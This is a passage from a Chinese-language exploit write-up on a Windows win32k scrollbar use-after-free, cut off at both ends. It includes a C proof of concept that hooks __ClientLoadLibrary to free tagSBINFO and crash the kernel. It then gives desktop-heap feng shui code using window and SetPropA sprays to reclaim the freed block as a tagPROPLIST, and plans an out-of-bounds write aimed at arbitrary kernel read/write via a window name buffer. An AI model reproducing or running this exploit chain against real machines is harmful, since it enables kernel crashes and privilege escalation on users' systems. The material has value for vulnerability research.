                DestroyWindow(hwnd);
            }
        }
    }
到现在为止我们终于可以构造出一个触发 BSOD 的 poc，在回调函数中调用 destorywindow 释放掉 `tagSBINFO` 结构，但是
window 对象并不会被立即释放，这涉及到引用计数机制，据资料说明 `tagSBINFO`
并没有引用计数机制，所以这里可以被释放掉，然后被释放掉的块在后续处理中有一次写操作，这样被释放的堆块就会受到影响，导致内核崩溃。大致代码如下：
    #include 
    const char g_szClassName[] = "poc";
    HWND hwnd;
    int hookflag = 0;
    int hookcount = 0;
    VOID * _ClientLoadLibrary;
    ULONG_PTR _ClientLoadLibrary_addr;
    VOID Fake__ClientLoadLibrary(VOID* a)
    {
        if (hookflag)
        {
            if (++hookcount == 2)
            {
                DestroyWindow(hwnd);
            }
        }
    }
    ... ...
    BOOL Trigger(int cmd, HINSTANCE h)
    {
        DWORD dwOldProtect = 0;
        // window which instantiates a scrollbar to be freed
        hwnd = CreateWindowExA(0, g_szClassName, 0, SBS_HORZ | WS_HSCROLL | WS_VSCROLL,
            10, 10, 100, 100, (HWND)NULL, (HMENU)NULL, h, (PVOID)NULL);
        if (hwnd == NULL)
            return FALSE;
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
        hookflag = 1;
        EnableScrollBar(hwnd, SB_CTL | SB_BOTH, ESB_DISABLE_BOTH);
        return TRUE;
    }
    int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
        PSTR szCmdLine, int iCmdShow)
    {
        _ClientLoadLibrary_addr = Get__ClientLoadLibrary();
        _ClientLoadLibrary = (void *)(ULONG_PTR *)_ClientLoadLibrary_addr;
        Hook__ClientLoadLibrary();
        InitWindows(hInstance);
        Trigger(iCmdShow, hInstance);
    }
下一步我们要做的就更有趣了，用堆风水把释放的块替换成指定的对象，这样可以做更多的事，不过要完成堆风水，我们需要对 desktop 的堆有一定的了解。
## Heap Feng Shui
有关 desktop 的堆在前面 win32k 的 paper 中有相关介绍，desktop 堆是 win32k.sys 用来存储给定 desktop
相关联的一系列 GUI 对象，包含了窗体对象和其相关结构，比如 property list，window text 和 scrollbar。  
每创建一个桌面就会有一个相应的堆为其服务，那么我们就可以分配一个新的桌面得到一个初始的堆，可以更稳定的进行调控。但资料中又提到一个信息，低权限进程是无法创建新的桌面的。
抛开这个问题，我们先明确堆风水要达成的目的，就是要把释放后的 tagSBINFO
结构的堆块替换成其他的结构堆块，利用结构体的特性修改一些关键的数据从而获得操作更多数据的能力，要完成替换就需要精准预测堆块的分配，尽可能完全控制整个堆的布局。比较可行的办法是先把释放的堆块尽可能填满，之后新分配的堆块就会排列在一起，然后在一系列连续的堆块中释放掉相应的块造成一个缺口，那么后面分配的块大概率会在缺口的位置，实现预测分配。
在桌面堆中分配的有三个重要的数据类型我们需要了解一下，主要就通过使用这些结构体来控制堆上的窗体相关的数据。每个窗体对象包含一个 `tagPROLIST`
结构体，它的大小足够小，在64位系统下分配的大小为 0x18 字节，可以用来填充一些比较小的缺口，该结构类型定义如下：
    kd> dt win32k!tagPROPLIST -r
        +0x000 cEntries         : Uint4B
        +0x004 iFirstFree       : Uint4B
        +0x008 aprop            : [1] tagPROP
            +0x000 hData            : Ptr64 Void
            +0x008 atomKey          : Uint2B
            +0x00a fs               : Uint2B
然后是窗体文本属性，在 `tagWND` 结构体中的成员 `strName` 可以分配任意大小的 UNICODE 字符串，
    kd>  dt win32k!tagWND -b strName
       +0x0d8 strName : _LARGE_UNICODE_STRING
还有就是 `tagSBINFO` 结构，正是用来引发 uaf 漏洞的那个对象，也可以控制部分字段的数据。从相关资料中可以获取到展示这些数据类型关系的图解：
现在我们的目标是把释放后的 `tagSBINFO` 的块替换成 `tagPROLIST` 结构体块，因为修改 `tagPROLIST`
结构上的某个成员可以获得任意地址读写的能力。Property 列表可以用 `SetProp()` 函数创建，该函数会先通过 `atomKey`
匹配查找是否有相同的 property 存在，如果没有相同的存在，就会在列表中创建新的 property 条目，初始的调用会创建一个 property
列表链接到 `tagWND` 结构中，其函数原型如下：
    BOOL SetPropA(
      HWND   hWnd,
      LPCSTR lpString,
      HANDLE hData
    );
思路是这样的，在初始的阶段先准备大量 `tagWND` 结构，并且每个 `tagWND` 都有相关联的 `tagPROLIST`，这个阶段的内存布局如下：
然后我们分配 scrollbar 准备触发 uaf，现在的内存布局如下：
接着设置 scrollbar 的一些参数控制回调函数调用 DestoryWindow 释放掉 `tagSBINFO`，内存布局就变成了：
64位系统下的 `tagSBINFO` 结构体是 0x28 字节，而单个条目的 `tagPROLIST` 结构体是 0x18 字节，再次调用
`setProp` 会增加一个 0x10 字节的 tagProp 条目，也刚好是 0x28
字节。我们前面已经通过堆喷射把可能释放的空间都填充完了，接下来分配的 `tagPROLIST` 由于没有更合适的位置，会被放到原来 `tagSBINFO`
的位置，具体是先释放一个窗体的属性列表，由于堆喷已经填满了空闲的内存，这个 0x18
字节的块周围并没有相邻空闲状态的块，这样就不会发生空闲块之间的合并，从而产生更大的空闲块，拥有足够的大小会影响到 `tagPROLIST`
的位置，这时我们增加 tagPROP 就会分配 0x28 字节大小的 `tagPROLIST` 且刚好落到原来 `tagSBINFO` 的位置，如图：
然后回调函数执行完后返回内核态触发 uaf 执行写操作，`tagPROLIST` 的 cEntries 字段会从 0x2 变为 0xe，这样我们可以用
setProp 越界写后面相邻的块。但是这只是个堆溢出，离任意地址读写还有相当一部分距离，怎样把这个越界写利用起来呢？我们先重新审视下
`tagPROLIST` 的定义：
    kd> dt win32k!tagPROPLIST -r
    +0x000 cEntries         : Uint4B ==> 表面一共有多少个tagPROP    ==> 用这个越界读写.
    +0x004 iFirstFree       : Uint4B ==> 表明当前正在添加第几个tagPROP结构体
    +0x008 aprop            : [1] tagPROP ==> 一个单项的tagProp
        +0x000 hData            : Ptr64 Void ==> 对应hData
        +0x008 atomKey          : Uint2B ==> 对应lpString
        +0x00a fs               : Uint2B ==> 无法控制, 和内核实现的算法无关
`tagPROLIST` 只有两个成员属性，`cEntries` 和 `iFirstFree` 分别表示 `tagPROP` 的数量和指向当前正在添加的
`tagPROP` 的位置。当插入新的 `tagPROP` 时会先对已有的 `tagPROP` 条目进行扫描直到到达 `iFirstFree`
指向的位置，这里并没有检查 `iFirstFree` 是否超过了 `cEntries`，但如果扫描中发现了相应的 `atomKey` 则会实施检查确保
`iFirstFree` 不和 `cEntries` 相等，然后新的 `tagPROP` 才会添加到 `iFirstFree` 索引的位置，如果
`iFirstFree` 和 `cEntries` 相等的话表明空间不够用了，就分配一个新的能容纳所插入条目的属性列表，同时原有的项被复制过来并插入新的项。
而 `tagPROP` 结构和 `SetProp()` 函数相关联，`hData` 成员对应 SetProp 的 `HANDLE hData`
参数，`atomkey` 对应 `lpString` 参数，且属于我们可控的范畴，根据文档的说明，我们可以用这个参数传递一个字符串指针或者16位的 atom
值，当传递字符串指针时会自动转化为 atom 值，这样我们可以传递任何 atom
值来控制两个字节的数据。不过还是有一些限制，当我们添加新的条目到列表中时，`atomKey`
不能重复，否则新的条目会把旧的给替换掉。另外还有一点值得注意的是 `tagPROP` 只有 0xc 字节大小，不过系统分配的是 0x10 字节用来对齐。  
这样一来我们每个添加的 `tagPROP` 情况是这样的：
    * Offset 0x0: 8 字节任意可控的数据 (hData) 
    * Offset 0x8: 2 字节大概可控的数据 (atomKey) 
    * Offset 0xa: 2 字节不可控的数据 (fs) 
    * Offset 0xc: 4 字节不能修改的数据 (padding)
这里在对相邻块进行覆写时会产生一个问题，如果只是覆盖相邻块开头的8字节就能产生效果就还行，但若是要继续往深了走覆盖后面的字段才能产生效果的话就会不可避免的破坏一些原本的值，可能造成崩溃，好在这有个不错的结构对象，就是
`tagWND` 结构体的 `strName` 成员，该成员的结构类型是`_LARGE_UNICODE_STRING`：
    kd>  dt win32k!tagWND -b strName
       +0x0d8 strName : _LARGE_UNICODE_STRING
    kd> dt !_LARGE_UNICODE_STRING
    win32k!_LARGE_UNICODE_STRING
        +0x000 Length           : Uint4B
        +0x004 MaximumLength    : Pos 0, 31 Bits
        +0x004 bAnsi            : Pos 31, 1 Bit
        +0x008 Buffer           : Ptr64 Uint2B
如果我们能够覆盖到 `Buffer` 字段就可以通过窗体字符串指针任意读写 `MaximumLength` 大小字节的数据。现在我们知道了如何用
`tagPROPLIST`
来修改数据，也知道哪些部分我们能控制，以及有哪些限制，接下来我们要做的就是想办法用这部分修改数据的能力获得任意地址读写的操作原语。
## Stage 2
按照我们的思路在初始化阶段准备大量 `tagWND` 结构：
    BOOL InitWindows(HINSTANCE hInstance, HWND* hwndArray, int count)
    {
        ...
        for (int i = 0; i < count; i++)
        {
            hwndArray[i] = CreateWindowExA(
                0,
                g_szClassName,
                0,
                WS_OVERLAPPEDWINDOW,
                CW_USEDEFAULT,
                CW_USEDEFAULT,
                CW_USEDEFAULT,
                CW_USEDEFAULT,
                (HWND)NULL,
                (HMENU)NULL,
                NULL,
                (PVOID)NULL
            );
            if (hwndArray[i] == NULL)
                return FALSE;
            SetPropA(hwndArray[i], (LPCSTR)(1), (HANDLE)0xCCCCCCCCCCCCCCCC);
        }
    }
    InitWindows(hInstance, inithwnd, MAX_OBJECTS);    // 这一部分作为内存填充
    InitWindows(hInstance, spraywnd, MAX_SPRAY_OBJECTS); // 这一部分为增加 tagPROP 条目作铺垫
    // 准备一个缺口
    for (int i = 0; i < count; i++)
    {
        if ((i % 0x150) == 0)
            DestroyWindow(inithwnd[i]);
    }
在回调函数中释放 `tagSBINFO` 然后分配 `tagPROPLIST`，这时是第二次调用 `setPropA`，所以分配的是 0x28 大小的块。
    if (hookflag)
    {
        if (++hookcount == 2)
        {